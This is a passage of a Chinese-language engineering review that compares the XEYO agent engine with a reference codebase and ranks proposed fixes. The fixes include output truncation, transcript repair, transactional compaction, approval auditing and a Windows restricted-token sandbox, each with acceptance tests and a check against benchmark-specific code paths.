| **撕裂尾修复** | ✅ `core/session/src/repair.ts`（合成闭合事件）+ 持久层的尾部修复 | ❌ **读侧只 `except json.JSONDecodeError: continue`（`:249-250`）——静默跳过坏行，不修复也不报告** |
| **跨进程租约** | ✅ 单写者 + 跨进程租约 | ❌ 只有 `threading.Lock`（**进程内**） |

**结论修正**：原建议「JSONL 加写后缓冲 + 撕裂尾 + 租约」应缩为**只做后两样**，成本从"一项中等工程"降到"一个小改动"。这是本文 P0 里性价比最高的一条。

> 复现：`python/session/record_transcript.py` 读 `:122-205`、`:236-283`；`dsh-src/packages/core/session/src/repair.ts`。

##### 2.3 更正三（**本文最重要**）：dsh 的沙箱**有 Windows 后端**，XEYO 可以直接对照移植

**前五轮的隐含判断**：沙箱是最大差距，但 XEYO "无内核级隔离原语可用（Windows 侧只有 Job Object，且是资源限额非隔离）"（第五轮 C-2），因此这条建议**落不了地**。

**实测事实**：dsh 有四平台后端，**其中 Win32 是一个真实的、已实现的、有完整设计决策记录的 rung**：

```
packages/sandbox/README.md          → 四包：sandbox（服务）/ sandbox-local（平台后端）/
                                       sandbox-policy（策略）/ sandbox-windows-acl（Windows 写限制）
packages/sandbox/sandbox-local/src/index.ts:161-165
    darwin: ['seatbelt'],
    win32:  ['windows-acl'],     ← Windows 有独立后端
```

**它的技术路线（`2026-08-08-windows-acl-restricted-token-sandbox.md`，43 行，逐字摘录关键段）：**

> `CreateRestrictedToken` with `WRITE_RESTRICTED` + `DISABLE_MAX_PRIVILEGE` + `LUA_TOKEN` … **`WRITE_RESTRICTED` intersects write accesses only, so reads keep the caller's ambient access while a write must also match one of these capability ACEs.**
>
> **The identity routes restrict by *who* runs the child; this rung restricts by *token derivation*.** An identity route (landstrip's restricted-user, AppContainer) runs the child under a fresh account or container SID that starts with zero ACEs on the host's files — everything, reads included, defaults to denied, and every path the child may touch must then be opened back up by writing ACEs for that identity: **the wholesale DACL mutation that disqualified both alternatives.**
>
> The per-workspace SID is derived deterministically from the canonical workspace path (`workspaceWriteSid` — sha256 → `S-1-4-x-y`) … Each live session/workspace pair instead gets a random private temp directory and a domain-separated SID … **A fork therefore cannot write its sibling's temp tree.**
>
> …this port **checks every API call and fails closed** (the POC fail-opened on ignored failures).
>
> Original decision left `PLATFORM_CHAINS.win32` empty, so shipped Windows profiles **degraded to danger-full-access** because no confining executor existed.

**为什么这条对 XEYO 是决定性的：**

1. **XEYO 是 Windows 优先产品**（Tauri 桌面壳、`tools/bash_tool/win_job.py` 已有 Job Object 封装）——沙箱这条建议从"平台不适用"变成"**有现成实现可对照**"。
2. **它的核心洞察正好绕开了 XEYO 的最大顾虑**：AppContainer 需要把宿主文件 DACL 大改（给新身份开一堆 ACE），工程与兼容风险都极高；**restricted token 只限制"写"，读沿用调用者权限**，所以**不需要动宿主 DACL**。
3. **XEYO 已有落点**：`tools/bash_tool/runner.py:345` 是唯一的 `subprocess.Popen` 调用点（`spawn_streaming`），`:160` 是同步路径——**confine 只需要包住这两个点**。
4. **它自己标注了已知缺口**（`enforcement: 'partial'`：Everyone 授权对象、硬链接别名）——**诚实标注缺口本身就是可直接抄的工程范式**，比"假装完备"更适合 XEYO 的审计文化。

> 复现：`dsh-src/packages/sandbox/README.md`（四包表）、`sandbox-local/src/index.ts:141-190`（平台链+enforcement）、`sandbox-local/src/profiles.ts`（bwrap/landlock/seatbelt argv 原文）、`.agents/notes/implemented/feature/2026-08-08-windows-acl-restricted-token-sandbox.md` 全文 43 行。

---

#### §3 候选池与排序（核心结论）

##### 3.1 总表

**图例**：成本 S = 单文件小改 / M = 多文件一个模块 / L = 需要一层设计。收益按"S1–S5 + W1/W2"综合。

| # | 优化点 | 来源轮次 | 落点（XEYO） | 成本 | 收益 | W1 连带简化 | W2 开源友好 | 优先级 |
|---|---|---|---|---|---|---|---|---|
| **1** | **沙箱 `confine(argv, policy)` seam + Windows restricted-token 后端** | 一/二/三/五 | `tools/bash_tool/runner.py:160,345`（唯一两个 spawn 点）→ 新增 `python/sandbox/` | **L** | ★★★★★ | **极高**（权限链可从 11 级降到 3 级） | 高（自包含、可单测、无私有数据） | **P2 战略** |
| **2** | **投影层加通用 `replace` 算子 + `sourceEventSeqs` 来源追踪** | 五（+本文更正一） | `session/surface.py:34-115`、`session/hydrate.py:128-146` | M | ★★★★☆ | 高（压缩/覆盖/注入统一走一条路） | 高 | **P1** |
| **3** | **工具结果头尾预算 + spill 到文件可取回** | 三/四 | `tools/bash_tool/truncate.py` | **S** | ★★★★☆ | 中 | 高 | **P0** |
| **4** | **JSONL 撕裂尾修复 + 跨进程租约** | 二/五（+本文更正二） | `session/record_transcript.py:249-250`（读侧）、`session/persistence.py` | **S** | ★★★☆☆ | 中 | 中 | **P0** |
| **5** | **压缩事务化：括号事务 + 工具配对平衡** | 三/四/五 | 无对应物（C0/C1/C2 是截断）→ 新增模块 | M | ★★★★☆ | 高（修掉"截断切断工具配对"这类根因） | 高 | **P1** |
| **6** | **命名事件瀑布（先只做"命名"，不要求可替换）** | 一/二 | `engine/query_loop.py`（2000 行，内联点位）、`engine/` 无事件总线 | M | ★★★★☆ | **极高**（今天的 guard 从"改引擎"变成"挂插件"） | 高 | **P1** |
| **7** | **审批记录与授权的审计配对 + 审批策略不入 transcript** | 五（A-6 vs B-6） | `permissions/store.py`、`permissions/pending_ttl.py` | S | ★★★☆☆ | 中 | 中 | **P1** |
| **8** | **`session-query` 式会话自查询工具** | 一/三 | `python/tools/`（新增 2–3 个只读工具） | M | ★★★☆☆ | 中 | 高 | **P2** |
| **9** | **质量门分级（per-module 覆盖率门，而非 per-file 100%）** | 一/四 | `scripts/check.ps1`、`.github/workflows/ci.yml` | S | ★★☆☆☆ | 低 | 高 | **P2** |
| **10** | **时间触发型定时任务** | 三/四 | `engine/scheduler.py`（已有 DAG，缺时间轴） | M | ★★☆☆☆ | 低 | 中 | **P3 择机** |

##### 3.2 一句话排序理由

**先做 P0（两个小改动，两周内可见收益，零架构风险）→ 再做 P1（投影泛化 + 压缩事务 + 命名事件，三者互相成全）→ 最后啃 P2（沙箱是"换地基"，必须等前三项让代码变干净之后再动）。**

**注意顺序不是按差距大小排的。** 沙箱差距最大，但它排最后，原因有三：
1. 它是**唯一会改变现有行为边界**的改动（confine 之后原本能跑的命令会失败），必须先有**审批分级 + 命名事件**（P1-#7、P1-#6）把"失败时如何优雅降级"这条路铺好；
2. 它做完会**连带简化权限链**——如果先做沙箱，那 11 级链可能就白改了；
3. 它是**唯一无法旁路验证**的一项，需要最干净的代码基线。

---

#### §4 逐项详解

##### P0-1 工具结果头尾预算 + spill 可取回

**问题**：XEYO 的结果截断是"保头丢尾"（`tools/bash_tool/truncate.py`）。长命令输出的**尾部**恰恰是错误摘要、退出码、失败原因最常出现的地方。

**dsh 参照**：`packages/spill/spill-policy/src/index.ts` —— 预算按 **`ceil`/`floor` 各半**分给头尾（第三轮 §8.2 实测），且超限内容 spill 到文件、模型看到的是**带取回指引的替代文本**，不是直接丢弃。

**落点**：`python/tools/bash_tool/truncate.py`（单文件）。

**改动**：
1. 截断预算改为头尾各半（保留头部上下文 + 保留尾部结论）；
2. 被截掉的中间段落盘到会话目录（复用 `session/transcript_blobs.py` 的内容寻址思路），替代文本里给**中性结果型**的落盘路径（不是"建议你去读"，只是"完整内容在 <path>"——符合引擎铁律第 1 条）。

**验收判据**（可证伪）：
- 生成 10000 行输出，末尾写 `FINAL_MARKER` → 截断后模型可见结果**必须包含** `FINAL_MARKER`；
- 落盘文件存在且字节数 = 原始输出；
- 中间段确实被省略（长度 < 原始）。

**为什么适合开源**：单文件、判据清晰、纯产品受益（不依赖任何评测口径）、任何人可复现。

---

##### P0-2 JSONL 撕裂尾修复 + 跨进程租约

**问题**（经 §2.2 更正后的精确版）：XEYO 已有缓冲/fsync/轮转，**只缺两样**：
1. **读侧静默跳过坏行**——`session/record_transcript.py:249-250` 的 `except json.JSONDecodeError: continue`。后果：半行 JSON 被无声吞掉，**故障不可观测**（违反 XEYO 自己的"不可观测则沉默"是给模型的纪律，但引擎自己需要可观测性）。
2. **只有进程内锁**——`_disk_lock = threading.Lock()`。多窗口 / 多进程开同一 session 时无跨进程保护。

**dsh 参照**：`core/session/src/repair.ts`（合成闭合事件修尾）+ `session-persistence-jsonl/src/storage.ts`（单写者 + 跨进程租约）。

**落点**：`session/record_transcript.py`（读侧 + 锁）、`session/persistence.py`（租约文件位置）。

**改动**：
1. **撕裂尾隔离（不是丢弃）**：读到无法解析的行 → 移入 `<name>.torn.<ts>` 旁置文件，主文件读取时跳过但**记一条审计**（`logger.warning` + 审计行），可观测、可恢复；
2. **跨进程租约**：session 目录下加 `<id>.lock`（含 pid + 获取时间 + 过期时间），写者启动时获取，崩溃后可按 pid 存活检测接管。

**验收判据**：
- 手工在 JSONL 末尾追加半行 `{"type":"assist` → 重新加载：**前后合法行全部保留**，半行进旁置文件，日志有警告；
- 两个进程同时打开同一 session → 第二个进程得到明确的租约冲突错误（不是无声交错）；
- 崩溃注入（kill -9 后重启）→ 已 fsync 的行全部可读。

**为什么适合开源**：小 diff、判据是崩溃注入测试、无架构影响。

---

##### P1-3 投影层加通用 `replace` 算子 + 来源追踪

**问题**（经 §2.1 更正后的精确版）：XEYO 的投影层 `fold_surface_rows` **只认识 2 个 op**（`rewind`/`rewind_undo`），因此凡是"要改模型可见面"的新需求（压缩、覆盖、注入式替换）都只能**另找一条路**——这正是"多个机制难以统一的根因"。

**dsh 参照**：`packages/core/session/src/surface.ts` —— `SurfaceOp` 有 `append` 与 `{ op:'replace' }` 两形态；`sourceEventSeqs` 记录替换来源（`session/index.ts:706`）；`deriveEventMessage()` 是**唯一一份"事件→消息"投影规则**（`surface.ts:80-130`），`Session.deriveMessages` 与外部重建器**共用同一个函数**（注释原文：*"THE per-node projection rule"*）。

**落点**：`session/surface.py`（加算子）、`session/hydrate.py:128-146`（投影管道）、`session/transcript_blobs.py`（行形状）。

**改动**：
1. 加第三个 op：`{"type":"surface_op","op":"replace","from":"<id>","to":"<id>","replaces":"<row id 或新行>","source_event_seqs":[...]}`；
2. `fold_surface_rows` 支持区间替换（现有影子化是"替换为空"，泛化为"替换为另一段"）；
3. **抽一个 `derive_row_message(row)` 作为唯一投影规则**，让 `messages_from_rows` 与任何重建器共用——这是 dsh 那条注释真正值钱的地方；
4. 行封套补 `seq` 与 `source_event_seqs`（现在 marker 只有 `rewind_id`/`shadow_from`）。

**验收判据**：
- 用 `replace` 算子实现一次"压缩"：原始 20 行 → 折叠后模型看到 3 行，**且人类侧仍能读到全部 20 行 append-origin**；
- 任意一条可见行都能回答"它来自哪些原始行"（`source_event_seqs` 非空）；
- 旧 transcript（无新算子）fold 结果恒等（向后兼容）。

**为什么适合开源**：向后兼容、可增量、有 `fold` 的单测面。

---

##### P1-4 压缩事务化：括号事务 + 工具配对平衡

**问题**：XEYO 的 C0/C1/C2 是**截断**不是**事务**（第三/四/五轮一致结论）。遇到"截断边界正好切断 `tool_use` ↔ `tool_result` 配对"这类问题，只能靠**事后修补**（`_repair_unpaired_tool_calls` 在 submit 入口做一次）。

**dsh 参照**：
- `packages/compaction/compaction/src/tool-pairing.ts` —— **配对平衡**：压缩边界必须落在配对完整的边界上；
- `packages/compaction/compaction/src/checkpoint.ts` —— **括号事务**：压缩开始/结束成对落事件，中途崩溃可判定"事务未完成"；
- 常量实测（第四轮 §9）：`0.8` 触发比 / `0.16` 保留比 / `8192` 单元 / `1`/`1` 阈值。

**落点**：新模块（**不动 C0/C1/C2 现有逻辑**，符合 S4 反巨石）——建议 `python/engine/compaction_txn.py`，与现有压缩并排，由开关选择。

**改动**：
1. 压缩前先算"配对安全边界"（把 cut 点吸附到最近的 `tool_use`/`tool_result` 完整处）；
2. 压缩前后各落一条事件（复用 §P1-3 的 `replace` 算子表达结果）；
3. 崩溃后靠"只有开始事件没有结束事件"判定事务未完成 → 丢弃这次压缩（幂等重试）。

**验收判据**：
- 构造"截断点正好落在 tool_use 与 tool_result 之间"的会话 → 压缩后**不出现**孤儿 `tool_use` 或孤儿 `tool_result`；
- 压缩中途 kill → 重启后会话仍可加载，且未出现半个压缩结果；
- 与现有 C0/C1/C2 开关并存，关掉新模块行为不变。

**为什么适合开源**：新模块、开关控制、判据是构造性测试。

---

##### P1-5 命名事件瀑布（先只做"命名"）

**问题**：`engine/query_loop.py` 2000 行，扩展点全是**内联**的。实测证据：

```
engine/query_loop.py:24      from engine.repeat_guard import (...)
engine/query_loop.py:774     repeat_guard = RepeatCallGuard()
engine/query_loop.py:1069-1072   guard_action = repeat_guard.observe(tu.name, tu.input)
engine/query_loop.py:175     decision = evaluate_policy(name, raw_input, cwd=..., tool=tool)
engine/query_loop.py:686     return run_pre_llm_inject(...)
engine/query_loop.py:1893    results_by_id[tu_id] = await tools.run(...)
```

而 `engine/` 下**没有任何命名事件总线**——只有 `permission_coordinator.py:235 _emit()` 与 `scheduler.py:289 _emit()` 两个**组件私有的**发点，互不相通。

**dsh 参照**：`docs/tool-execution-pipeline.md` + `core/tools/src/index.ts` 的 `tools/pre-execute` / `tools/execute` / `tools/post-execute` 瀑布（第三轮 §7.2、第四轮 §3 逐阶段表）。**它的价值不在于"可替换"，而在于"任何行为都有名字、都能被观测"。**

**落点**：新模块 `python/engine/event_waterfall.py`（发布/订阅），在 `query_loop.py` 的既有内联点**只加发布语句**（`AGENTS.md` #7 允许"只留接线点"）。

**改动**（**第一步只做命名 + 观测，不要求可替换**）：
1. 定义事件名：`turn/pre-step`、`request/assemble`、`llm/stream-chunk`、`tool/pre-execute`、`tool/post-execute`、`turn/close`；
2. 在每个既有内联点旁边加一行 `publish(EVENT_NAME, payload)`；
3. **先把订阅方定为"记录器"**（把事件写进审计/telemetry），不改变任何行为。

**验收判据**：
- 跑一个完整 turn，能按顺序收到全部 6 类事件，每类带 payload；
- 加一个订阅者不需要改 `query_loop.py`（这是"命名事件"的证明）；
- 关掉开关，行为与现在**逐字节一致**（回归测试）。

**为什么适合开源**：纯增量、开关控制、是后续所有"挂插件"能力的前置。

---

##### P1-6 审批审计配对 + 审批策略不入 transcript

**问题**（来自第五轮 C-1 ④ 的对照）：XEYO 有 `runtime_mode_snapshot` T_now 块，把"当前审批模式"**告知模型**；dsh 反过来，把审批策略做成**动态 context 且不进 transcript**，注释写明理由：**切换策略不重写稳定前缀**。

这两者不是谁对谁错，而是**两条不同的失败模式**。但 XEYO 有一个可独立改进的点：**审批记录与授权结果的审计配对**。

**dsh 参照**：`approval/asked` + `approval/decided` 成对落 session log；审批结果是**封闭四值**，唯一授予值 `allowed-once`，无 answerer → `unavailable`（fail-closed）。

**落点**：`permissions/store.py`（`PendingPermission` 结构，`:33-70`）、`permissions/pending_ttl.py`（风险分级 TTL，实测常量 `:20-24`：普通 `180.0s` / 危险 `60.0s` / 提醒提前 `30.0s`，`_DANGER_MARKERS = ("danger","secret","protected")`，`None` = 不超时；四类固定文案 `REJECTED_COPY`/`CANCELLED_COPY`/`UNAVAILABLE_COPY`）。

**改动**：
1. 每次审批挂起/解决都写一条**审计配对**（同一个 `pending_id`），使"谁在什么时候批准了什么"可追溯；
2. 明确标注**授权来源**（系统预设 / 用户本次 / 指纹复用），便于事后区分"用户真的同意过"与"复用了一个旧 grant"。

**验收判据**：
- 任意一次审批都能从审计里查到完整配对（asked → decided，含 mode、来源、耗时）；
- 指纹复用的审批在审计里**与本次确认可区分**。

**为什么适合开源**：只加记录不改行为、零风险。

---

##### P2-1 沙箱 `confine(argv, policy)` seam + Windows restricted-token 后端 ★最大项

**问题**：XEYO 的 Bash 一落地就**没有第二道防线**。现有的一切（11 级权限链、18 条 bash 正则、密钥拦截、WriteStore 三门）**都是文本分析**——它们让误用变难，但不构成隔离。　〔校勘（本次核实）：应为 **19 条正则 / 10 类标签**，块区间 `L20–L105`——见导言 §0.3-A〕

**这是五轮里最硬的一处差距，而且现在已知它有 Windows 路线。**

**dsh 参照（可直接对照移植）**：

| 层面 | dsh 实现 | 文件 |
|---|---|---|
| 接口 | `confine(argv, policy)` 单函数 | `sandbox/sandbox/src/index.ts` |
| 策略 | `read-only` / `workspace-write` / `danger-full-access` | `sandbox-policy/src/index.ts` |
| 平台链 | `linux: [bwrap, landlock]` / `darwin: [seatbelt]` / `win32: [windows-acl]` | `sandbox-local/src/index.ts:161-165` |
| **Windows 机制** | `CreateRestrictedToken`（`WRITE_RESTRICTED` + `DISABLE_MAX_PRIVILEGE` + `LUA_TOKEN`）；**只交写访问**，读沿用调用者权限；per-workspace SID = sha256(路径) → `S-1-4-x-y`；per-session 随机 temp + 独立 SID | `sandbox-windows-acl` + 决策记录 43 行 |
| 失败姿态 | **fail-closed**：无后端 → 拒绝运行（`PLATFORM_CHAINS.win32` 原为空 → 曾降级为 `danger-full-access`，这是个**已修复的事故**） | `escalation.ts:130-175` |
| 升级 | 一次性、用户批准的 escalation | `sandbox/src/escalation.ts` |
| 诚实标注 | `enforcement: 'partial'`，已知缺口（Everyone 授权对象、硬链接别名）**被测试钉死** | `sandbox-local/src/index.ts:186` |

**落点**：
- 新增 `python/sandbox/`（`__init__.py` + `policy.py` + `windows_acl.py` + `probe.py`）；
- 接线点**只有两个**：`tools/bash_tool/runner.py:160`（`subprocess.run`）与 `:345`（`subprocess.Popen`）；
- `tools/bash_tool/win_job.py` 已有 Job Object 封装——restricted token 与 Job Object **可叠加**（token 管权限，Job 管资源），不是二选一。

**改动分三步（每步独立可验证，符合 S2 旁路优先）**：

| 步 | 内容 | 判据 |
|---|---|---|
| 1 | **只做接口与探测**：定义 `confine(argv, policy) -> argv`，Windows 后端先返回原 argv 并标 `enforcement: 'none'`；加一个**功能性探测**（像 dsh `defaultProbeWindowsAcl` 那样真的跑一次） | 探测能正确报告"本机是否支持"；关掉开关行为不变 |
| 2 | **接 restricted token**：`CreateRestrictedToken` + `CreateProcessAsUser` 包装 spawn；`read-only` 模式零写授权 | 在 `read-only` 下 `echo x > /workspace/f` **必须失败**；`read` 同一路径**必须成功**（验证"只交写"这个核心性质） |
| 3 | **接入 escalation**：被拦的命令走一次性用户批准后重试 | 批准后命令成功；拒绝后返回中性错误（引擎铁律：`Permission denied: …` 措辞） |

**必须遵守的三条**：
1. **fail-closed，但分平台**：Windows 后端不可用时可显式降级为"当前行为 + 明示 `enforcement: none`"——**不能静默装作隔离生效**（这正是 dsh 那个已修复事故的教训）。
2. **不动宿主 DACL**：这是 restricted-token 路线的全部价值所在。任何"给新身份写 ACE"的设计都是在重走被否决的 AppContainer 老路。
3. **缺口要标注且钉测试**：Everyone 授权对象、硬链接别名——写进 README 并写回归测试（dsh 就是这么做的）。

**验收判据**：见上表三步。另加一条**否定**判据：关掉开关后，`tools/bash_tool` 的全部现有测试**逐条通过**（证明旁路形态成立）。

**为什么排最后**：它是唯一会**改变现有行为边界**的改动，也是唯一**无法旁路验证**的。必须先有 P1-6（审批分级）铺好"失败时怎么优雅降级"、P1-5（命名事件）铺好"拦截点在哪观测"，再动它。

**为什么适合开源**：接口是单函数、后端是自包含模块、有明确的"已知缺口"清单——**这是最适合外部贡献者认领的形状**（一个平台后端一个 PR）。

---

##### P2-2 会话自查询工具

**问题**：XEYO 有 `_workspace_index.jsonl` 与完整 transcript，但**模型自己不能查**。dsh 有 5 个会话历史自查询工具（`session_event_read` / `session_event_search` / `session_event_trace` 等，第三轮 §2）。

**落点**：`python/tools/` 新增只读工具，注册进 `TOOL_META`（注意 `tools/catalog.py:359` 的 `XEYO_BENCH_MINIMAL` 裁剪集要同步决策）。

**验收判据**：能回答"上一轮我改了哪些文件"并给出行号级证据；工具是只读的（不触发权限 ASK）。

**风险提示**：这是**唯一一条可能触碰应试性红线**的建议——见 §5.2。

---

##### P2-3 质量门分级

**问题**：XEYO 的提交门是 `scripts/check.ps1`（pytest not live + typecheck + vitest + slash manifest check），**没有覆盖率门**。dsh 是 **per-file 100%**。

**落点**：`scripts/check.ps1`、`.github/workflows/ci.yml`。

**改动**：**不做 per-file 100%**（对 160k 行 Python 不现实，见 §7），改做：
- 新增/修改的文件覆盖率 ≥ 80%；
- `python/rewind/`、`session/`、`permissions/` 三个高风险模块整体 ≥ 70%；
- 覆盖率**只降不升即红**（ratchet，防止倒退）。

**验收判据**：故意删一个测试 → CI 红。

---

#### §5 红线自检：逐条过应试性审查

XEYO 有一条用户红线：**任何修改不能是应试修改**。四条尺子（`docs/应试性审查-副作用修复与53号.md`）逐条对本文 10 项建议过一遍。

##### 5.1 R1 产品受益（不是只评测受益）

**全部 10 项均通过**。逐条说清楚产品收益：

| 项 | 产品收益 | 是否只在评测里受益 |
|---|---|---|
| P0-1 头尾预算 | 用户看长日志不再丢错误摘要 | ❌ 否 |
| P0-2 撕裂尾 | 崩溃后会话可恢复、故障可观测 | ❌ 否 |
| P1-3 投影泛化 | 人类侧永远看得到完整历史（审计） | ❌ 否 |
| P1-4 压缩事务 | 会话不因压缩产生孤儿工具调用 | ❌ 否 |
| P1-5 命名事件 | 诊断/审计/后续扩展点 | ❌ 否 |
| P1-6 审批审计 | 用户能查"谁批准了什么" | ❌ 否 |
| P2-1 沙箱 | **用户数据与系统的实际保护** | ❌ 否（这是最纯粹的产品安全收益） |
| P2-2 自查询 | 模型能自查历史，减少重复劳动 | ⚠️ **需注意**，见 5.2 |
| P2-3 覆盖率门 | 回归防护 | ❌ 否 |
| P3 定时任务 | 用户可设"每天跑一次" | ❌ 否 |

##### 5.2 R2 无评测分支（**唯一需要注意的一项**）

**P2-2 会话自查询工具**存在一个风险面：dsh 的 `session-query` 包在 TerminalBench 场景下**可能恰好受益**。若实现时出现下面任何一种形状，**即为应试**：

- ❌ `if os.environ.get("XEYO_BENCH_MINIMAL")` 或 `if 任务名 in ...` 才注册该工具；
- ❌ 工具的查询能力**只能读评测判分器需要的东西**；
- ❌ 该工具只为"让模型看到更多历史"而存在，而正常用户场景下无意义。

✅ **正确的形状**：工具无条件注册、无条件可用，收益在**用户日常使用**中可观察到（"上一轮我改了哪些文件"）。

**P2-1 沙箱的对称风险**：若写成"容器路由就跳过 confine"，即为应试——这条 `AGENTS.md` 已经明确禁止（*"'容器路由就跳过'一律应试，禁止"*）。正确写法是 **confine 与执行通道无关**，容器内也要过同一层判定。

**其余 8 项不存在评测分支可能。**

##### 5.3 R3 信息纪律（不注入引擎无法核实的事实、不做导演）

**P0-1 有一处需要注意**：spill 后的替代文本**只能给事实**。

- ✅ `完整输出已落盘：<path>`（事实）
- ❌ `建议你读取完整输出`（导演）、`输出被截断了，请注意`（评价）

其余各项：
- P2-1 沙箱的拒绝措辞必须是**中性结果型**（`Permission denied: …`），符合引擎铁律第 3 条；
- P1-3 投影层的 `source_event_seqs` 是给**审计侧**用的，不注入模型上下文；
- P1-5 命名事件**不产生任何模型可见文本**（只进审计/telemetry）。

##### 5.4 R4 收益可证伪

**全部 10 项均给出了构造性判据**（§4 每项的"验收判据"），且**不依赖判分器或 `/tests` 目录**。这是本文筛选时最花力气的一条——凡是只能说"更好"的都已被剔除。

**逐条复核**：P0-1 用 `FINAL_MARKER`；P0-2 用半行 JSON 注入；P1-3 用"20 行→3 行但人类侧 20 行"；P1-4 用"cut 点落在配对中间"；P1-5 用"关掉后逐字节一致"；P1-6 用审计配对可查；P2-1 用"read-only 下写失败、读成功"；P2-2 用"能回答且给证据"；P2-3 用"删测试即红"；P3 用"定时真的触发"。**无一条依赖外部判分。**

##### 5.5 自检结论

**10 项建议全部通过 R1/R3/R4；R2 有两项需要实现时守住形状（P2-2 无条件注册、P2-1 不按执行通道分叉）。**

---

#### §6 建议的实施顺序与依赖

```
                        ┌─────────────────────────────────────────┐
   P0（独立，可并行）    │  P0-1 头尾预算+spill   P0-2 撕裂尾+租约  │
                        └────────────────┬────────────────────────┘
                                         │  （无依赖，先做；建立"小改动+构造性测试"的节奏）
                                         ▼
                        ┌─────────────────────────────────────────┐
   P1（三者互相成全）    │  P1-3 投影泛化  ──▶  P1-4 压缩事务        │
                        │        │                                │
                        │        └──▶  P1-5 命名事件 ──▶ P1-6 审批审计│
                        └────────────────┬────────────────────────┘
                                         │  （投影泛化提供"改可见面"的统一手段；
                                         │    压缩事务是它的第一个客户；
                                         │    命名事件提供观测点；审批审计提供降级路径）
                                         ▼
                        ┌─────────────────────────────────────────┐
   P2（换地基）          │  P2-1 沙箱 confine + Windows 后端        │
                        │  （依赖 P1-6 的降级路径 + P1-5 的观测点）│
                        │  P2-2 自查询   P2-3 覆盖率门（可并行）   │
                        └─────────────────────────────────────────┘
```

**关键依赖解释**：

1. **P1-3 → P1-4**：压缩事务需要一种"改模型可见面"的表达方式。投影层泛化之后，压缩不再需要自己发明表达——**这是 W1 连带简化最典型的一例**。
2. **P1-5 → P2-1**：沙箱必须能观测"哪一刀拦了什么"。命名事件提供挂点，否则 confine 只能插在 `runner.py` 里当裸代码。
3. **P1-6 → P2-1**：沙箱一定会有"原本能跑、现在被拦"的情况。审批审计 + 分级 TTL 是"优雅降级"的既有设施，先有它再上沙箱。
4. **P0 完全独立**，可以立刻开工，且它们建立的"构造性测试"习惯正是后面大项的基础。

---

#### §7 明确不建议照搬的清单

**这一节和 §3 同等重要。** dsh 的很多能力是它开发者预览定位与 255 包架构的产物，搬进 XEYO 只会变重。

| 不照搬 | 理由 |
|---|---|
| **Cordis 插件框架 / 255 包结构** | XEYO 的产品形态是"一个引擎 + 一个桌面产品"，不是"一个运行时 + 五个应用形态"。包粒度细 16 倍对 XEYO 是纯负担。**只借"命名事件"这个最小内核**（P1-5）。 |
| **Typert 类型化 RPC** | 解决的是"TS 前后端 + 多语言 SDK 的类型漂移"。XEYO 是 Python 引擎 + 单一 TS 客户端，`slash/export_manifest` 的生成式门禁已经覆盖了同类需求（且更轻）。 |
| **per-file 100% 覆盖率门** | dsh 能这么做是因为 255 个小包每个都小；XEYO 有 2000 行的 `query_loop.py`、1110 行的 `scheduler.py`。**要做覆盖率就用 ratchet（P2-3），不要用 100%。** |
| **51 类会话事件全盘对齐** | dsh 的 39 个插件事件是它插件生态的产物。XEYO 需要的是**少数几类高价值事件 + 通用投影算子**（P1-3），不是事件数量。 |
| **`request/header` 全量入日志** | 收益（逐字重建"模型当时看到什么"）是真的，但成本是**每次请求多写一份完整上下文快照**——对 XEYO 的会话文件体积是数量级影响。**建议：只对"发生压缩/回溯的那一次请求"做快照**（按需，不是每轮）。 |
| **双 SDK（TS + Python）+ ACP server** | 是"被集成"需求；XEYO 目前的集成面是 GUI/TUI/CLI，还没到需要对外协议的时候。 |
| **i18n 双语** | 纯投入，与当前目标无关。 |
| **E2B 云沙箱 / PTY 持久终端 / LSP seam** | 三个都是"有平台前提"的能力：E2B 要云、PTY 要 Unix 终端语义、LSP 要语言服务器生态。XEYO 的 Windows 优先定位下优先级极低。 |
| **workflow 脚本引擎 + `ralph`** | XEYO 已有 DAG 调度器（`engine/scheduler.py`，被 `subagent_runner` 等实际消费）。缺的是**时间轴**（P3），不是另一套编排。 |
| **把 `engine/scheduler.py` 当死代码删掉** | **绝不是**。第三/四轮已实测它被多处消费。这是第一轮的实测错误，已被更正。 |

---

#### §8 结论（一句话级）

1. **五轮 7680 行，最终要做的不是十件事，是一个顺序**：先用两个小改动（P0-1/P0-2）建立"构造性测试"的节奏，再用三个互相成全的中项（投影泛化 → 压缩事务 → 命名事件）把代码变干净，最后才动唯一一件"换地基"的事（沙箱）。

2. **沙箱是唯一一项"做了会连带简化其他一切"的改动**——它做完，11 级权限链、18 条 bash 正则、WriteStore 三门这些"因为有风险所以必须细"的设计都可以变粗。这才是它排在最值得做的第一位的真正理由，而它排在实施顺序的最后一位，是因为它最需要干净的地基。　〔校勘（本次核实）：应为 **19 条正则 / 10 类标签**，块区间 `L20–L105`——见导言 §0.3-A〕

3. **而它现在有了一条 Windows 路径**（restricted token + ACL 写授权，只交写不交读，不需要动宿主 DACL）——这消除了"XEYO 是 Windows 产品所以用不了沙箱"这个最大的落地顾虑。**这是本文最有价值的单条发现。**

4. **XEYO 不需要"补成一个 dsh"**。它的四块独有资产（T_now 治理 / rewind 五件套 / 权限细化 / 成本治理）里，有三块是 dsh **完全没有**的。要做的是**在它现有的纪律下面铺一层地基**，而不是用地基替换纪律。

5. **两条硬红线在实施时守住**：P2-2 必须无条件注册（不得有 `BENCH_MINIMAL` 分支），P2-1 不得按执行通道分叉（"容器路由就跳过"一律应试）。其余八项无风险。

---

*本文基于五轮共 7680 行对比报告；§2 的三处更正为本文落笔前新增核实，均可一行命令复现。若与前面轮次冲突，以本文为准。*

## 5.2 高杠杆优化点收益评估（决策 B 全文）

> 来源：**决策 B·高杠杆收益评估** · 原节「XEYO 高杠杆优化点评估（五轮总结 · 收益视角）」（源 L1–720）

#### XEYO 高杠杆优化点评估（五轮总结 · 收益视角）

> **这份文档不回答"按什么顺序做"**（那是 `XEYO-开源优化路线-五轮总结.md` 的职责），
> **只回答一个问题**：五轮 7,680 行对比里，哪几个点既**完美适配 XEYO 已有架构肌理**、
> 又**收益巨大**。
>
> 口径：所有"已存在 / 不存在"的断言都由本轮**直接读源码复核**，带 `文件:行号`。
> 与前面任何一轮冲突时，**以本文为准**——因为本文是本轮为做收益判断而重跑的证据。

---

##### §0 一句话结论

**收益量级最大的是沙箱，但最优选择不是它。**

本轮把"收益巨大"和"完美适配"拆成两个独立维度打分后发现：**沙箱同时在两个榜上都靠前，却在"适配度"上失分**——它要新建一层、会改变现有行为边界、且做完之后现有的 11 级权限链与 18 条 bash 黑名单**大概率要重写**。先做它，等于在还没铺地的地基上盖楼。　〔校勘（本次核实）：应为 **19 条正则 / 10 类标签**，块区间 `L20–L105`——见导言 §0.3-A〕

真正**两个维度同时登顶**的是另外两个点：

| 排名 | 点 | 为什么 |
|---|---|---|
